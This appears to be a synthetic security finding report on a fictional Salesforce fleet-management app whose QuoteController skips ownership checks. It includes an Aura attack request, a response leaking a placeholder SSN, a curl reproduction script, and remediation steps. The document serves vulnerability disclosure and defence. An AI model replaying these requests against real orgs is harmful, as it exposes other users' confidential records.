# Security Analysis Report
**System:** OreTrack Fleet Management (Salesforce-Integrated)
**Domain:** Mining / Fleet Management
**Example ID:** SF-0075
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design — Pattern 3.1 | Client-assumed authority on `QuoteController.getQuoteDetails` — attacker reads any mining fleet Quote record without server-side ownership check |

---

## Finding 1 — Insecure Design: Client-Assumed Authority on Quote Object (Pattern 3.1)

### Summary
The Apex controller `QuoteController` on OreTrack Fleet Management (`bf1195e6.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Quote object. Per §5.0 Pattern 3.1, the design assumes the client will only supply `quoteId` values it legitimately owns. No server-side ownership check is enforced.

**Pattern:** 3.1 — Client-assumed authority (Insecure Design)
**Affected controller:** `c.QuoteController.getQuoteDetails`
**Affected endpoint:** `POST https://bf1195e6.lightning.force.com/aura`
**Note:** Apex method name and Aura descriptor both use `getQuoteDetails` — consistent within context.txt.

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://bf1195e6.lightning.force.com/aura
Authorization: Bearer 00DBF1195E6!ARbf1195e6...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DBF1195E6!ARbf1195e6...

message={"actions":[{"id":"1;a","descriptor":"c.QuoteController.getQuoteDetails","callingDescriptor":"UNKNOWN",
"params":{"quoteId":"00195E6","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Quote Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "00195E6", "Name": "Victim Quote Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-22-6748"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DBF1195E6!ARbf1195e6..."
curl -s -X POST "https://bf1195e6.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.QuoteController.getQuoteDetails","callingDescriptor":"UNKNOWN","params":{"quoteId":"00195E6","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-22-6748
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class QuoteController { ... }`
2. `WHERE Id = :quoteId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
